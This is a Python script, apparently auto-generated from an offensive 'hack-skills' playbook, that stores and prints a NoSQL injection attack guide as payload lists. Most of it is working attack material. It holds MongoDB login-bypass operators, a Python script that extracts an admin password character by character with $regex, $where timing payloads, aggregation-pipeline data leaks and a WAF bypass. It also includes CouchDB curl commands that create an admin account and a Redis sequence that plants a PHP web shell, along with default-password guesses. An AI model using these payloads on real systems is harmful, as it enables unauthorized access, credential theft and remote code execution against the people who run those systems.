#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/nosql-injection

Skill: SKILL: NoSQL Injection — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-nosql-injection.py --help
      python hack-skills-nosql-injection.py --list
      python hack-skills-nosql-injection.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/nosql-injection'
TITLE = 'SKILL: NoSQL Injection — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: nosql-injection", "description: >-", "NoSQL injection playbook. Use when MongoDB-style operators, JSON query objects, flexible search filters, or backend query DSLs may allow data or logic abuse."],
    'skill-nosql-injection-expert-attack-playbook': [],
    '1-core-concept-operator-injection': ["**SQL Injection** breaks out of string literals.", "**NoSQL Injection** injects **query operators** that change query logic.", "MongoDB example \u2014 normal query:", "```javascript", "db.users.find({username: \"alice\", password: \"secret\"})", "Injection via JSON operator:", "```json", "\"username\": \"admin\",", "\"password\": {\"$gt\": \"\"}", "\u2192 Becomes: `find({username:\"admin\", password:{$gt:\"\"}})` \u2192 password > \"\" \u2192 always true!"],
    '2-mongodb-login-bypass': [],
    'json-body-injection-api-with-json-content-type': ["```json", "POST /api/login", "Content-Type: application/json", "{\"username\": \"admin\", \"password\": {\"$ne\": \"invalid\"}}", "{\"username\": \"admin\", \"password\": {\"$gt\": \"\"}}", "{\"username\": {\"$ne\": \"invalid\"}, \"password\": {\"$ne\": \"invalid\"}}", "{\"username\": \"admin\", \"password\": {\"$regex\": \".*\"}}"],
    'php-post-array-injection-url-encoded-form': ["username=admin&password[$ne]=invalid", "username=admin&password[$gt]=", "username[$ne]=invalid&password[$ne]=invalid", "username=admin&password[$regex]=.*"],
    'ruby-python-params-array-injection': ["Same as PHP \u2014 use bracket notation to inject objects:", "?username[%24ne]=invalid&password[%24ne]=invalid", "`%24` = URL-encoded `$`"],
    '3-mongodb-operators-for-injection': [],
    '4-blind-data-extraction-via-regex': ["Like binary search in SQLi, use `$regex` to extract field values character by character:", "```json", "// Does admin's password start with 'a'?", "{\"username\": \"admin\", \"password\": {\"$regex\": \"^a\"}}", "// Does admin's password start with 'b'?", "{\"username\": \"admin\", \"password\": {\"$regex\": \"^b\"}}", "// Continue: narrow down each position", "{\"username\": \"admin\", \"password\": {\"$regex\": \"^ab\"}}", "{\"username\": \"admin\", \"password\": {\"$regex\": \"^ac\"}}", "**Response difference**: successful login vs failed login = boolean oracle.", "**Automate** with NoSQLMap or custom script with binary search on character set."],
    '5-mongodb-where-injection-js-execution': ["`$where` evaluates JavaScript in MongoDB context.", "**Can only use current document's fields** \u2014 not system access. But allows logic abuse:", "```json", "{\"$where\": \"this.username == 'admin' && this.password.length > 0\"}", "// Blind extraction via timing:", "{\"$where\": \"if(this.username=='admin'){sleep(5000);return true;}else{return false;}\"}", "// Regex via JS:", "{\"$where\": \"this.username.match(/^adm/) && true\"}", "**Limit**: `$where` doesn't give OS command execution \u2014 **server-side JS injection** (not to be confused with command injection)."],
    '6-aggregation-pipeline-injection': ["When user-controlled data enters `$match` or `$group` stages:", "```javascript", "// Vulnerable code:", "db.collection.aggregate([", "{$match: {category: userInput}},  // userInput = {\"$ne\": null}", "Inject operators to bypass:", "```json", "// Input as object:", "{\"$ne\": null}  \u2192 matches all categories", "{\"$regex\": \".*\"}  \u2192 matches all"],
    '7-http-parameter-pollution-for-nosql': ["Some frameworks (Express.js, PHP) parse repeating parameters as arrays:", "?filter=value1&filter=value2 \u2192 filter = [\"value1\", \"value2\"]", "Use `qs` library parse behavior in Node.js:", "?filter[$ne]=invalid", "\u2192 parsed as: filter = {$ne: \"invalid\"}", "\u2192 NoSQL operator injection"],
    '8-couchdb-attacks': [],
    'http-admin-api-if-exposed': ["```bash"],
    'list-databases': ["curl http://target.com:5984/_all_dbs"],
    'read-all-documents-in-a-db': ["curl http://target.com:5984/DATABASE_NAME/_all_docs?include_docs=true"],
    'create-admin-account-if-anonymous-access-allowed': ["curl -X PUT http://target.com:5984/_config/admins/attacker -d '\"password\"'"],
    '9-redis-injection': ["Redis exposed (6379) with no auth \u2014 command injection via input used in Redis queries:"],
    'via-ssrf-or-direct-injection': ["SET key \"<?php system($_GET['cmd']); ?>\"", "CONFIG SET dir /var/www/html", "CONFIG SET dbfilename shell.php", "BGSAVE", "**Auth bypass** (older Redis with `requirepass` using simple password):", "AUTH password", "AUTH 123456", "AUTH redis", "AUTH admin"],
    '10-detection-payloads': ["Send these to any input processed by NoSQL backend:", "true, $where: '1 == 1'", ", $where: '1 == 1'", "$where: '1 == 1'", "', $where: '1 == 1", "1, $where: '1 == 1'", "{ $ne: 1 }", "', sleep(1000)", "1' ; sleep(1000)", "{\"$gt\": \"\"}", "{\"$ne\": \"invalid\"}", "[$ne]=invalid", "[$gt]=", "**JSON variant** test (change Content-Type to `application/json` if endpoint is form-based):", "```json", "{\"username\": \"admin\", \"password\": {\"$ne\": \"\"}}"],
    '11-nosql-vs-sql-key-differences': [],
    '12-testing-checklist': ["\u25a1 Test login fields with: {\"$ne\": \"invalid\"} JSON body", "\u25a1 Test URL-encoded forms: password[$ne]=invalid", "\u25a1 Test $regex for blind enumeration of field values", "\u25a1 Try $where with sleep() for time-based blind", "\u25a1 Check 5984 port for CouchDB (unauthenticated admin)", "\u25a1 Check 6379 port for Redis (unauthenticated)", "\u25a1 Try Content-Type: application/json on form endpoints", "\u25a1 Monitor for operator-related error messages (\"BSON\" \"operator\" \"$not allowed\")"],
    '13-blind-nosql-extraction-automation': [],
    'regex-character-by-character-extraction-python-template': ["```python", "import requests", "import string", "url = \"http://target/login\"", "charset = string.ascii_lowercase + string.digits + string.punctuation", "password = \"\"", "while True:", "found = False", "for c in charset:", "payload = {", "\"username\": \"admin\",", "\"password[$regex]\": f\"^{password}{c}.*\"", "r = requests.post(url, json=payload)", "if \"success\" in r.text or r.status_code == 302:", "password += c", "found = True", "print(f\"Found: {password}\")", "break", "if not found:", "break", "print(f\"Final password: {password}\")"],
    'regex-via-url-encoded-get-parameters': ["username=admin&password[$regex]=^a.*", "username=admin&password[$regex]=^ab.*"],
    'iterate-through-charset-until-login-succeeds': [],
    'duplicate-key-bypass': ["```json", "// When app checks one key but processes another:", "{\"id\": \"10\", \"id\": \"100\"}", "// JSON parsers typically use last occurrence", "// Bypass: WAF validates id=10, app processes id=100"],
    '14-aggregation-pipeline-injection': ["When user input reaches MongoDB aggregation pipeline stages:", "```javascript", "// If user controls $match stage:", "db.collection.aggregate([", "{ $match: { user: INPUT } }  // INPUT from user", "// Injection: provide object instead of string", "// INPUT = {\"$gt\": \"\"} \u2192 matches all documents", "// $lookup for cross-collection data access:", "// If $lookup stage is injectable:", "{ $lookup: {", "from: \"admin_users\",       // attacker-chosen collection", "localField: \"user_id\",", "foreignField: \"_id\",", "as: \"leaked\"", "// $out to write results to new collection:", "{ $out: \"public_collection\" }  // Write query results to accessible collection"],
    'where-javascript-execution': ["```javascript", "// $where allows arbitrary JavaScript (DANGEROUS):", "db.users.find({ $where: \"this.username == 'admin'\" })", "// If input reaches $where:", "// Injection: ' || 1==1 || '", "// Or: '; return true; var x='", "// Time-based: '; sleep(5000); var x='", "// Data exfil: '; if(this.password[0]=='a'){sleep(5000)}; var x='", "**Reference**: Soroush Dalili \u2014 \"MongoDB NoSQL Injection with Aggregation Pipelines\" (2024)", "**Note:** `$where` runs JavaScript on the server. Besides logic abuse and timing oracles, older MongoDB builds without a tight V8 sandbox historically raised RCE concerns; prefer treating any `$where` sink as high risk."],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()